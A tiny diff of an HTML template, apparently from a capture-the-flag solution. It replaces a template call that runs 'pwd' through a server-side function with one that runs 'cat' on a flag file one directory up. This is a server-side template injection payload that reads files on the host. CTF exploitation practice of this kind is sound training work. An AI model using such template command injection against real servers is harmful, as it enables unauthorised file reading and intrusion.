@@ -36,7 +36,7 @@
                 <h1>Available template data</h1>
                 <hr>
                 <ul>
-                    <li>{{.FetchServerInfo "pwd"}}/li>
+                    <li>{{.FetchServerInfo "cat ../flag91aef2c728.txt"}}/li>
                     <li>{{.ClientUA}}</li>
                     <li>ClientIpInfo.IpVersion</li>
                     <li>ClientIpInfo.IpAddress</li>
